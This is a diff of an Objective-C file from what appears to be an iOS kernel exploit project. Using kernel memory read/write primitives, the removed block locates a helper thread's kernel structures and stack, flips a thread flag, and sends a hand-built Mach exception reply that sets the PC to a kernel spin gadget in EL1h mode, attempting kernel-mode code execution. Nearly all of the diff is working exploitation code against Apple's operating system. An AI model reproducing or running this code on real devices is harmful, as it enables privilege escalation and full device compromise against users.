@@ -45,9 +45,7 @@ extern kern_return_t mach_vm_deallocate(vm_map_read_t target_task, mach_vm_addre
 
 #import "exploit/kexploit_opa334.h" // darksword_*_socket_pcb() (corrupted inpcb VAs) for the zone route
 #import "exploit/kutils.h"          // proc_self() — direct own-proc VA, no allproc walk
-#import "exploit/offsets.h"
-// TaskRop: exception port API
-         // off_proc_ro_pr_task / off_task_map
+#import "exploit/offsets.h"         // off_proc_ro_pr_task / off_task_map
 
 static BOOL kpLooksLikeKernelPointer(uint64_t v)
 {
@@ -2422,105 +2420,6 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                                     }
                                 }
                                 kpNote(r, [NSString stringWithFormat:@"  [BOOT] offsets:%@", found]);
-                            }
-                            // ---- KCALL EXC 2.0.111: FAKE_PC → exception → EL1 return ----
-                            if (thK && tkr == KERN_SUCCESS && threads && tcount > 1) {
-                                mach_port_t hp = threads[1];
-                                uint64_t hK = 0;
-                                uint64_t heVA = isT + (uint64_t)sizeof_ipc_entry * (hp >> 8);
-                                uint64_t hie = kp_untag_ptr(early_kread64(heVA + off_ipc_entry_ie_object));
-                                if (kpLooksLikeKernelPointer(hie)) {
-                                    for (uint32_t ko = 0x18; ko <= 0x50 && !hK; ko += 8) {
-                                        uint64_t cand = kp_untag_ptr(early_kread64(hie + ko));
-                                        if (!kpLooksLikeKernelPointer(cand)) continue;
-                                        for (uint32_t o = 0; o < 0x480; o += 8) {
-                                            uint64_t troC = kp_untag_ptr(early_kread64(cand + o));
-                                            if (kpLooksLikeKernelPointer(troC) &&
-                                                kp_untag_ptr(early_kread64(troC + 0x48)) == tkT) { hK = cand; break; }
-                                        }
-                                    }
-                                }
-                                kpNote(r, [NSString stringWithFormat:@"  [KCALL] helper port=0x%x thread*=%#llx", hp, (unsigned long long)hK]);
-                                if (hK) {
-                                    // kernel stack: +0xe8 кандидат
-                                    uint64_t kstack = kp_untag_ptr(early_kread64(hK + 0xe8));
-                                    uint64_t spin = 0;
-                                    uint64_t kb2 = kconstant(base);
-                                    for (uint64_t a = kb2; a < kb2 + 0x200000 && !spin; a += 4)
-                                        if ((uint32_t)early_kread64(a) == 0x14000000) spin = a;
-                                    kpNote(r, [NSString stringWithFormat:@"  [KCALL] kstack=%#llx spin=%#llx", (unsigned long long)kstack, (unsigned long long)spin]);
-                                    // exception port
-                                    mach_port_t excport = MACH_PORT_NULL;
-                                    mach_port_options_t opts = { .flags = MPO_INSERT_SEND_RIGHT | 0x8000, .mpl = { .mpl_qlimit = 5 } };
-                                    kern_return_t ekr = mach_port_construct(mach_task_self(), &opts, 0, &excport);
-                                    kpNote(r, [NSString stringWithFormat:@"  [KCALL] excport kr=0x%x port=0x%x", ekr, excport]);
-                                    if (ekr == KERN_SUCCESS && excport && spin && kstack) {
-                                        thread_set_exception_ports(hp, EXC_MASK_ALL, excport, EXCEPTION_DEFAULT, ARM_THREAD_STATE64);
-                                        // options: TH_IN_MACH_EXCEPTION
-                                        uint64_t oVA = hK + 0xC0;
-                                        uint64_t o0 = early_kread64(oVA);
-                                        early_kwrite64(oVA, o0 | 0x8000ULL);
-                                        // state с FAKE_PC — вызовет fault
-                                        arm_thread_state64_t st;
-                                        memset(&st, 0, sizeof(st));
-                                        st.__opaque_pc = (void *)(uintptr_t)0x301;   // FAKE_PC
-                                        st.__opaque_lr = (void *)(uintptr_t)0x401;   // FAKE_LR
-                                        kern_return_t skr = thread_set_state(hp, ARM_THREAD_STATE64,
-                                                                            (thread_state_t)&st, ARM_THREAD_STATE64_COUNT);
-                                        kpNote(r, [NSString stringWithFormat:@"  [KCALL] setstate FAKE_PC kr=0x%x", skr]);
-                                        thread_resume(hp);
-                                        // ждём exception
-                                        uint8_t excbuf[0x200];
-                                        memset(excbuf, 0, sizeof(excbuf));
-                                        mach_msg_header_t *hdr = (mach_msg_header_t *)excbuf;
-                                        kern_return_t wkr = mach_msg(hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
-                                                                    0x160, excport, 500, MACH_PORT_NULL);
-                                        kpNote(r, [NSString stringWithFormat:@"  [KCALL] waitexc kr=0x%x id=%d", wkr, hdr->msgh_id]);
-                                        if (wkr == KERN_SUCCESS) {
-                                            // подменяем state: PC=spin, LR=spin, SPSR=EL1h (0x3c5)
-                                            // exception reply layout: threadState по смещению
-                                            // kp_excreply: Head(0x20) + NDR(8) + RetCode(4) + flavor(4) + new_stateCnt(4) + threadState
-                                            // threadState.__x[0] начинается после 0x20+8+4+4+4 = 0x38
-                                            uint64_t *ts = (uint64_t *)(excbuf + 0x38);
-                                            // __x[29]=29*8, __fp, __lr, __sp, __pc → __pc at offset 29*8+24 = 0xf8 from threadState
-                                            // но это в excmsg (request), не reply. Для reply пишем через kp_statereply-подобную структуру.
-                                            // Простой путь: соберём reply вручную
-                                            uint8_t replybuf[0x140];
-                                            memset(replybuf, 0, sizeof(replybuf));
-                                            // remote_port = hdr->msgh_remote_port
-                                            *(uint32_t *)(replybuf + 0) = MACH_MSGH_BITS(MACH_MSG_TYPE_MOVE_SEND_ONCE, 0); // msgh_bits
-                                            *(uint32_t *)(replybuf + 4) = 0x13c; // msgh_size
-                                            *(uint32_t *)(replybuf + 8) = hdr->msgh_remote_port;
-                                            *(uint32_t *)(replybuf + 12) = 0;
-                                            *(uint32_t *)(replybuf + 16) = hdr->msgh_id + 100;
-                                            // NDR at 0x20
-                                            // RetCode at 0x28 = 0
-                                            *(uint32_t *)(replybuf + 0x2c) = ARM_THREAD_STATE64; // flavor
-                                            *(uint32_t *)(replybuf + 0x30) = ARM_THREAD_STATE64_COUNT;
-                                            // threadState at 0x38: x[0..28], fp, lr, sp, pc, cpsr
-                                            uint64_t *rs = (uint64_t *)(replybuf + 0x38);
-                                            rs[29] = kstack + 0x3000;  // __fp
-                                            rs[30] = spin;             // __lr
-                                            rs[31] = kstack + 0x3000;  // __sp
-                                            rs[32] = spin;             // __pc
-                                            *(uint32_t *)(replybuf + 0x38 + 33 * 8) = 0x3c5; // cpsr = EL1h
-                                            kern_return_t rkr = mach_msg((mach_msg_header_t *)replybuf, MACH_SEND_MSG,
-                                                                        0x13c, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
-                                            kpNote(r, [NSString stringWithFormat:@"  [KCALL] reply kr=0x%x (EL1h pc=spin)", rkr]);
-                                            usleep(50000);
-                                            thread_suspend(hp);
-                                            arm_thread_state64_t out;
-                                            mach_msg_type_number_t cnt = ARM_THREAD_STATE64_COUNT;
-                                            thread_get_state(hp, ARM_THREAD_STATE64, (thread_state_t)&out, &cnt);
-                                            kpNote(r, [NSString stringWithFormat:@"  [KCALL] after pc=%#llx → %@",
-                                                      (unsigned long long)(uintptr_t)out.__opaque_pc,
-                                                      ((uint64_t)(uintptr_t)out.__opaque_pc == spin) ? @"KERNEL-MODE SPIN ★★★" : @"иное состояние"]);
-                                        }
-                                        early_kwrite64(oVA, o0);
-                                        thread_terminate(hp);
-                                        mach_port_deallocate(mach_task_self(), excport);
-                                    }
-                                }
                             }
                                                     }
                         // 2.0.97: дамп thread* 0x00..0x200 — ищем kstack/PAC по контенту
